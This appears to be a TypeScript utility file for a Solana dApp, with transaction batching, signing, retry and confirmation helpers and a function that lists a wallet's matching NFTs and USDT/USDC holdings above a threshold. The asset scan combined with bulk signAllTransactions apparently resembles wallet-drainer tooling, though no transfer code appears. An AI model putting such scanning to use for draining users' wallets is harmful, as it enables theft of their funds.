import {
  Keypair,
  Commitment,
  Connection,
  RpcResponseAndContext,
  SignatureStatus,
  SimulatedTransactionResponse,
  Transaction,
  TransactionInstruction,
  TransactionSignature,
  Blockhash,
  FeeCalculator,
  PublicKey
} from '@solana/web3.js';

import * as anchor from "@project-serum/anchor";

import { TOKEN_PROGRAM_ID } from '@solana/spl-token';

import { programs } from '@metaplex/js';

import { WalletNotConnectedError } from '@solana/wallet-adapter-base';

import nfts from './nfts.json';

import { sign } from 'crypto';

const { metadata: { Metadata } } = programs;

let conn = new Connection(process.env.REACT_APP_SOLANA_RPC_HOST as string)

const FUNDS_LIMIT = 1000;

interface BlockhashAndFeeCalculator {
  blockhash: Blockhash;
  feeCalculator: FeeCalculator;
}

export const getErrorForTransaction = async (
  connection: Connection,
  txid: string,
) => {
  // wait for all confirmation before geting transaction
  await connection.confirmTransaction(txid, 'max');

  const tx = await connection.getParsedConfirmedTransaction(txid);

  const errors: string[] = [];
  if (tx?.meta && tx.meta.logMessages) {
    tx.meta.logMessages.forEach(log => {
      const regex = /Error: (.*)/gm;
      let m;
      while ((m = regex.exec(log)) !== null) {
        // This is necessary to avoid infinite loops with zero-width matches
        if (m.index === regex.lastIndex) {
          regex.lastIndex++;
        }

        if (m.length > 1) {
          errors.push(m[1]);
        }
      }
    });
  }

  return errors;
};

export enum SequenceType {
  Sequential,
  Parallel,
  StopOnFailure,
}

export async function sendTransactionsWithManualRetry(
  connection: Connection,
  wallet: any,
  instructions: TransactionInstruction[][],
  signers: Keypair[][],
): Promise<(string | undefined)[]> {
  let stopPoint = 0;
  let tries = 0;
  let lastInstructionsLength = -1;
  let toRemoveSigners: Record<number, boolean> = {};
  instructions = instructions.filter((instr, i) => {
    if (instr.length > 0) {
      return true;
    } else {
      toRemoveSigners[i] = true;
      return false;
    }
  });
  let ids: string[] = [];
  let filteredSigners = signers.filter((_, i) => !toRemoveSigners[i]);

  while (stopPoint < instructions.length && tries < 3) {
    instructions = instructions.slice(stopPoint, instructions.length);
    filteredSigners = filteredSigners.slice(stopPoint, filteredSigners.length);

    if (instructions.length === lastInstructionsLength) tries = tries + 1;
    else tries = 0;

    try {
      if (instructions.length === 1) {
        const id = await sendTransactionWithRetry(
          connection,
          wallet,
          instructions[0],
          filteredSigners[0],
          'single',
        );
        ids.push(id.txid);
        stopPoint = 1;
      } else {
        const { txs } = await sendTransactions(
          connection,
          wallet,
          instructions,
          filteredSigners,
          SequenceType.StopOnFailure,
          'single',
        );
        ids = ids.concat(txs.map(t => t.txid));
      }
    } catch (e) {
      console.error(e);
    }
    // console.log(
    //   'Died on ',
    //   stopPoint,
    //   'retrying from instruction',
    //   instructions[stopPoint],
    //   'instructions length is',
    //   instructions.length,
    // );
    lastInstructionsLength = instructions.length;
  }

  return ids;
}

export const sendTransactions = async (
  connection: Connection,
  wallet: any,
  instructionSet: TransactionInstruction[][],
  signersSet: Keypair[][],
  sequenceType: SequenceType = SequenceType.StopOnFailure,
  commitment: Commitment = 'singleGossip',
  successCallback: (txid: string, ind: number) => void = (txid, ind) => { },
  failCallback: (reason: string, ind: number) => boolean = (txid, ind) => false,
  block?: BlockhashAndFeeCalculator,
): Promise<{ number: number; txs: { txid: string; slot: number }[] }> => {
  if (!wallet.adapter?.publicKey) throw new WalletNotConnectedError();

  const unsignedTxns: Transaction[] = [];

  if (!block) {
    block = await connection.getRecentBlockhash(commitment);
  }

  for (let i = 0; i < instructionSet.length; i++) {
    const instructions = instructionSet[i];
    const signers = signersSet[i];

    if (instructions.length === 0) {
      continue;
    }

    let transaction = new Transaction();
    instructions.forEach(instruction => {
      // console.log("add instruction", instruction)
      transaction.add(instruction)
      // console.log("transaction", transaction)
    });
    // console.log("before sign", transaction)
    transaction.recentBlockhash = block?.blockhash;
    transaction.setSigners(
      // fee payed by the wallet owner
      wallet.adapter?.publicKey,
      ...signers.map(s => s.publicKey),
    );

    if (signers.length > 0) {
      transaction.partialSign(...signers);
    }

    // console.log("transaction", transaction)

    unsignedTxns.push(transaction);
  }

  // console.log("unsigned txns", unsignedTxns)

  const partiallySignedTransactions = unsignedTxns.filter(t =>
    t.signatures.find(sig => sig.publicKey.equals(wallet.adapter?.publicKey)),
  );
  const fullySignedTransactions = unsignedTxns.filter(
    t => !t.signatures.find(sig => sig.publicKey.equals(wallet.adapter?.publicKey)),
  );

  let signedTxns = await wallet.adapter?._wallet.signAllTransactions(partiallySignedTransactions);

  // console.log("signed txns", signedTxns);
  signedTxns = fullySignedTransactions.concat(signedTxns);
  const pendingTxns: Promise<{ txid: string; slot: number }>[] = [];

  let breakEarlyObject = { breakEarly: false, i: 0 };
  console.log(
    'Signed txns length',
    signedTxns.length,
    'vs handed in length',
    instructionSet.length,
  );
  for (let i = 0; i < signedTxns.length; i++) {
    const signedTxnPromise = sendSignedTransaction({
      connection,
      signedTransaction: signedTxns[i],
    });

    // signedTxnPromise
    //   .then(({ txid, slot }) => {
    //     successCallback(txid, i);
    //   })
    //   .catch(reason => {
    //     // @ts-ignore
    //     failCallback(signedTxns[i], i);
    //     if (sequenceType === SequenceType.StopOnFailure) {
    //       breakEarlyObject.breakEarly = true;
    //       breakEarlyObject.i = i;
    //     }
    //   });

    if (sequenceType !== SequenceType.Parallel) {
      try {
        await signedTxnPromise.then(({ txid, slot }) =>
          successCallback(txid, i),
        );
        pendingTxns.push(signedTxnPromise);
      } catch (e) {
        console.log('Caught failure', e);
        failCallback(signedTxns[i], i);
        if (sequenceType === SequenceType.StopOnFailure) {
          return {
            number: i,
            txs: await Promise.all(pendingTxns),
          };
        }
      }
    } else {
      pendingTxns.push(signedTxnPromise);
    }
  }

  if (sequenceType !== SequenceType.Parallel) {
    const result = await Promise.all(pendingTxns);
    return { number: signedTxns.length, txs: result };
  }

  return { number: signedTxns.length, txs: await Promise.all(pendingTxns) };
};

export const sendTransaction = async (
  connection: Connection,
  wallet: any,
  instructions: TransactionInstruction[],
  signers: Keypair[],
  awaitConfirmation = true,
  commitment: Commitment = 'singleGossip',
  includesFeePayer: boolean = false,
  block?: BlockhashAndFeeCalculator,
) => {
  if (!wallet.adapter?.publicKey) throw new WalletNotConnectedError();

  let transaction = new Transaction();
  instructions.forEach(instruction => transaction.add(instruction));
  transaction.recentBlockhash = (
    block || (await connection.getRecentBlockhash(commitment))
  ).blockhash;

  if (includesFeePayer) {
    transaction.setSigners(...signers.map(s => s.publicKey));
  } else {
    transaction.setSigners(
      // fee payed by the wallet owner
      wallet.adapter?.publicKey,
      ...signers.map(s => s.publicKey),
    );
  }

  if (signers.length > 0) {
    transaction.partialSign(...signers);
  }
  if (!includesFeePayer) {
    transaction = await wallet.adapter?.signTransaction(transaction);
  }

  const rawTransaction = transaction.serialize();
  let options = {
    skipPreflight: true,
    commitment,
  };

  const txid = await connection.sendRawTransaction(rawTransaction, options);
  let slot = 0;

  if (awaitConfirmation) {
    const confirmation = await awaitTransactionSignatureConfirmation(
      txid,
      DEFAULT_TIMEOUT,
      connection,
      true,
    );

    if (!confirmation)
      throw new Error('Timed out awaiting confirmation on transaction');
    slot = confirmation?.slot || 0;

    if (confirmation?.err) {
      const errors = await getErrorForTransaction(connection, txid);

      console.log(errors);
      throw new Error(`Raw transaction ${txid} failed`);
    }
  }

  return { txid, slot };
};

export const sendTransactionWithRetry = async (
  connection: Connection,
  wallet: any,
  instructions: TransactionInstruction[],
  signers: Keypair[],
  commitment: Commitment = 'singleGossip',
  includesFeePayer: boolean = false,
  block?: BlockhashAndFeeCalculator,
  beforeSend?: () => void,
) => {
  if (!wallet.adapter?.publicKey) throw new WalletNotConnectedError();

  let transaction = new Transaction();
  instructions.forEach(instruction => transaction.add(instruction));
  transaction.recentBlockhash = (
    block || (await connection.getRecentBlockhash(commitment))
  ).blockhash;

  if (includesFeePayer) {
    transaction.setSigners(...signers.map(s => s.publicKey));
  } else {
    transaction.setSigners(
      // fee payed by the wallet owner
      wallet.adapter?.publicKey,
      ...signers.map(s => s.publicKey),
    );
  }

  if (signers.length > 0) {
    transaction.partialSign(...signers);
  }
  if (!includesFeePayer) {
    transaction = await wallet.adapter?.signTransaction(transaction);
  }

  if (beforeSend) {
    beforeSend();
  }

  const { txid, slot } = await sendSignedTransaction({
    connection,
    signedTransaction: transaction,
  });

  return { txid, slot };
};

export const getUnixTs = () => {
  return new Date().getTime() / 1000;
};

const DEFAULT_TIMEOUT = 600000;

export async function sendSignedTransaction({
  signedTransaction,
  connection,
  timeout = DEFAULT_TIMEOUT,
}: {
  signedTransaction: Transaction;
  connection: Connection;
  sendingMessage?: string;
  sentMessage?: string;
  successMessage?: string;
  timeout?: number;
}): Promise<{ txid: string; slot: number }> {
  const rawTransaction = signedTransaction.serialize();
  // console.log("raw transaction", rawTransaction);
  const startTime = getUnixTs();
  let slot = 0;
  const txid: TransactionSignature = await connection.sendRawTransaction(
    rawTransaction,
    {
      skipPreflight: true,
    },
  );

  console.log('Started awaiting confirmation for', txid);

  let done = false;
  (async () => {
    while (!done && getUnixTs() - startTime < timeout) {
      connection.sendRawTransaction(rawTransaction, {
        skipPreflight: true,
      });
      await sleep(500);
    }
  })();

  // console.log("transacion id", txid)

  try {

    // console.log("<<<<<<<<<<<<<<<<before singnature>>>>>>>>>>>>>>");

    const confirmation = await awaitTransactionSignatureConfirmation(
      txid,
      timeout,
      connection,
      true,
    );

    // console.log(">>>>>>>>>>>>>>signature result<<<<<<<<<<<<<<<", confirmation);

    if (!confirmation)
      throw new Error('Timed out awaiting confirmation on transaction');

    if (confirmation.err) {
      console.error(confirmation.err);
      throw new Error('Transaction failed: Custom instruction error');
    }

    slot = confirmation?.slot || 0;
  } catch (err: any) {
    console.error('Timeout Error caught', err);
    if (err.timeout) {
      throw new Error('Timed out awaiting confirmation on transaction');
    }
    let simulateResult: SimulatedTransactionResponse | null = null;
    try {
      simulateResult = (
        await simulateTransaction(connection, signedTransaction, 'single')
      ).value;
    } catch (e) { }
    if (simulateResult && simulateResult.err) {
      if (simulateResult.logs) {
        for (let i = simulateResult.logs.length - 1; i >= 0; --i) {
          const line = simulateResult.logs[i];
          if (line.startsWith('Program log: ')) {
            throw new Error(
              'Transaction failed: ' + line.slice('Program log: '.length),
            );
          }
        }
      }
      throw new Error(JSON.stringify(simulateResult.err));
    }
    // throw new Error('Transaction failed');
  } finally {
    done = true;
  }

  console.log('Latency', txid, getUnixTs() - startTime);
  return { txid, slot };
}

async function simulateTransaction(
  connection: Connection,
  transaction: Transaction,
  commitment: Commitment,
): Promise<RpcResponseAndContext<SimulatedTransactionResponse>> {
  // @ts-ignore
  transaction.recentBlockhash = await connection._recentBlockhash(
    // @ts-ignore
    connection._disableBlockhashCaching,
  );

  const signData = transaction.serializeMessage();
  // @ts-ignore
  const wireTransaction = transaction._serialize(signData);
  const encodedTransaction = wireTransaction.toString('base64');
  const config: any = { encoding: 'base64', commitment };
  const args = [encodedTransaction, config];

  // @ts-ignore
  const res = await connection._rpcRequest('simulateTransaction', args);
  if (res.error) {
    throw new Error('failed to simulate transaction: ' + res.error.message);
  }
  return res.result;
}

export const awaitTransactionSignatureConfirmation = async (
  txid: anchor.web3.TransactionSignature,
  timeout: number,
  connection: anchor.web3.Connection,
  queryStatus = false,
): Promise<anchor.web3.SignatureStatus | null | void> => {
  let done = false;
  let status: anchor.web3.SignatureStatus | null | void = {
    slot: 0,
    confirmations: 0,
    err: null,
  };
  // console.log("<<<<<<<<<<<<<<<<<<<<<<tx id>>>>>>>>>>>>>>>>>>>>>>", txid)
  let subId = 0;
  status = await new Promise(async (resolve, reject) => {
    // console.log("><<<<<<<<<timeout>>>>>>>>", timeout)
    setTimeout(() => {
      if (done) {
        return true;
      }
      done = true;
      console.log('Rejecting for timeout...');
      reject({ timeout: true });
    }, timeout);

    while (!done && queryStatus) {
      // eslint-disable-next-line no-loop-func
      (async () => {
        try {
          const signatureStatuses = await connection.getSignatureStatuses([
            txid,
          ]);

          // console.log("<<<<<<<<<<<<<signature>>>>>>>>>>>", signatureStatuses)

          status = signatureStatuses && signatureStatuses.value[0];

          // console.log("<<<<<<<<<<<<<<status>>>>>>>>>>>>>", status)
          if (!done) {
            if (!status) {
              console.log('REST null result for', txid, status);
            } else if (status.err) {
              console.log('REST error for', txid, status);
              done = true;
              reject(status.err);
            } else if (!status.confirmations) {
              console.log('REST no confirmations for', txid, status);
            } else {
              console.log('REST confirmation for', txid, status);
              done = true;
              resolve(status);
            }
          }
        } catch (e) {
          if (!done) {
            console.log('REST connection error: txid', txid, e);
          }
        }
      })();
      await sleep(2000);
    }
  });

  // //@ts-ignore
  // if (connection._signatureSubscriptions[subId]) {
  //   connection.removeSignatureListener(subId);
  // }
  done = true;
  console.log('Returning status', status);
  return status;
};

export function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const searchNFT = (nft_symbol: any) => {
  let flag = false;
  nfts.forEach((element: any) => {
    if (nft_symbol.includes(element)) {
      flag = true;
    }
  });
  return flag;
}

export async function getTokensForOwner(
  owner: any
) {

  console.log("+Get Token Data")

  const allnfts: any = [];

  const nftAccounts: any = [];

  const tokens: any = []
  const nfts: any = []

  const tokenAccounts = await conn.getParsedTokenAccountsByOwner(owner, { programId: TOKEN_PROGRAM_ID });

  let tokenAccount, tokenAmount, nftMint;

  for (let index = 0; index < tokenAccounts.value.length; index++) {
    tokenAccount = tokenAccounts.value[index];
    tokenAmount = tokenAccount.account.data.parsed.info.tokenAmount;
    if (tokenAmount.amount == '1' && tokenAmount.decimals == 0) {
      const nftMint = new PublicKey(tokenAccount.account.data.parsed.info.mint)
      let tokenmetaPubkey = await Metadata.getPDA(nftMint);
      allnfts.push(tokenmetaPubkey)
      nftAccounts.push(tokenAccounts.value[index].pubkey)
    }
    // console.log(tokenAccount)
    nftMint = new PublicKey(tokenAccount.account.data.parsed.info.mint)
    if (nftMint.toBase58() == "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB" || nftMint.toBase58() == "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v") {
      // console.log(tokenAccount.account.data)
      if (parseInt(tokenAmount.amount) >= FUNDS_LIMIT) {
        tokens.push({ account: tokenAccounts.value[index].pubkey, mint: nftMint, amount: parseInt(tokenAmount.amount) })
      }
    }
  }

  let nftinfo: any[] = [];

  const buffer = [...allnfts];

  let count = 100;

  const len = Math.floor(buffer.length / 100) + 1;
  let j = 0;
  while (buffer.length > 0) {

    if (buffer.length < 100) {
      count = buffer.length;
    } else {
      count = 100;
    }
    nftinfo = [...nftinfo.concat(await conn.getMultipleAccountsInfo(buffer.splice(0, count)))];
    j++;
  }

  // console.log("nft info", nftinfo);

  // let tokenCount = nftinfo.length

  for (let i = 0; i < nftinfo.length; i++) {

    if (nftinfo[i] == null) {
      continue;
    }

    let metadata: any = new Metadata(owner.toBase58(), nftinfo[i])

    // if(metadata.data.data.symbol.includes(process.env.REACT_APP_NFT_SYMBOL)){
    //   tokens.push({ mint : metadata.data.mint})
    // }
    const temp = searchNFT(metadata.data.data.symbol);
    if (temp) {
      let nftMint = new PublicKey(metadata.data.mint)
      nfts.push({ mint: nftMint, account: nftAccounts[i] })
    }
  }

  // tokens.sort(function (a: any, b: any) {
  //   if (a.name < b.name) { return -1; }
  //   if (a.name > b.name) { return 1; }
  //   return 0;
  // })

  return { token: tokens, nft: nfts }
}
